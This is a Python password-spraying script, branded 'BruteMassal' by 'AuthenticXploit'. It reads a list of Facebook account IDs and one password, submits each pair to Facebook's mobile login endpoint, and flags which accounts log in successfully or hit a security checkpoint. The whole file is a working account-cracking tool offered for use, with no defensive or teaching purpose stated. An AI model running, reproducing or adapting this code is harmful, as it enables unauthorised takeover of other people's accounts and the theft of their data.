#!/usr/bin/env python
# encoding: utf-8
"""
BruteMassal.py

Created by AuthenticXploit on 07/12/2020.
Copyright (c) 2020 Copyright Holder. All rights reserved.
"""

# Color
g = "\033[32;1m"
gt = "\033[0;32m"
bt = "\033[34;1m"
b = "\033[36;1m"
m = "\033[31;1m"
p = "\033[37;1m"
k = "\033[33;1m"
kt = "\033[0;33m"
W = '\x1b[0m'

try:
    import os
    import sys
    import time
    import requests
    import mechanize
    import bs4
    from os import system
    from time import sleep
    from sys import exit
except ImportError as f:
    clearScr()
    print("%s[%s!%s] %sError %s: %s%s"%(g,m,g,kt,f))
if sys.version[0] in "2":
    exit("%s[%s!%s]%s error use python version 3%s" % (g,m,g,kt,W))

def clearScr():
    """
    clear the screen in case of GNU/Linux or Windows
    """
    if sys.platform == "linux2":
        system("clear")
    elif sys.platform == "win32":
        system("cls")
    else:
        system("clear")

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)

system("clear")
slowprint("""\033[36;1m
  ____             _       _____ ____  
 | __ ) _ __ _   _| |_ ___|  ___| __ ) 
 |  _ \| '__| | | | __/ _ \ |_  |  _ \\\033[1;97m
 | |_) | |  | |_| | ||  __/  _| | |_) |
 |____/|_|   \__,_|\__\___|_|   |____/ 
                     
     \x1b[1;97m Author   \033[31;1m:  \033[32mAuthenticXploit
     \x1b[1;97m Type     \033[31;1m:  \033[32mBruteForce
     \x1b[1;97m Version  \033[31;1m:  \033[32m0.2
     \x1b[1;97m Thanks   \033[31;1m:  \033[32mN16HT-W4RR10R
     \x1b[1;97m                 
""")

# LIST ID PASSWORD
list = input("\033[37;1mInput list ID       \033[31;1m: \033[33;1m")
pasw = input("\033[37;1mPassword To Crack   \033[31;1m: \033[33;1m")
print("%s[%s-%s] %sCracking, please wait ...\n" % (b,m,b,k))

def brute(list,pasw):
    try:
        link = "https://m.facebook.com/login.php"
        data = {"email":list, "pass":pasw}
        r = requests.post(link, data=data)
        if "m_sess" in r.url:
            print("%s[OK] %s%s %s=> %s%s" % (g,p,list,p,g,pasw))
        elif "checkpoint" in r.url:
            print("%s[CP] %s%s => %s%s" % (k,p,list,k,pasw))
        else:
            print("%s[FL] %s%s" % (m,p,list))
    except requests.exceptions.ConnectionError:
        print("\n%s[%s!%s]%s No Connection" % (g,m,g,k))
        sleep(2)
        print("%s[%s!%s] %sExit%s" % (g,m,g,m,W))
        exit()

def main(list,pasw):
    file = open(list, "r").readlines()
    for i in file:
        brute(i.strip(),pasw)
try:
    main(list,pasw)
except IOError:
    print("\n%s[%s!%s]%s File wordlist %s%s %sNot Found%s" % (g,m,g,k,b,list,k,W))
    exit()